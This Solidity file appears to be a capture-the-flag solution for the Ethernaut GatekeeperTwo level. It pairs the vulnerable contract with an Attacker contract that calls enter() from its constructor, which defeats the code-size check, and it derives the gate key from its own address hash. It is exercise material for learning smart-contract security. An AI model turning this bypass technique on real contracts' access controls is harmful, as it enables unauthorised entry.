// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }     // should be get executed on instructor
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attacker {
    // address public victim = 0x5e17b14ADd6c386305A32928F985b29bbA34Eff5; // fake level
    address public victim = 0x378F1E594b305ebbF24abc295ADFda7b9D1D7230; // real level

    bytes8 public key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);

    constructor () public {
        GatekeeperTwo _victim = GatekeeperTwo(victim);
        _victim.enter(key);
    }
}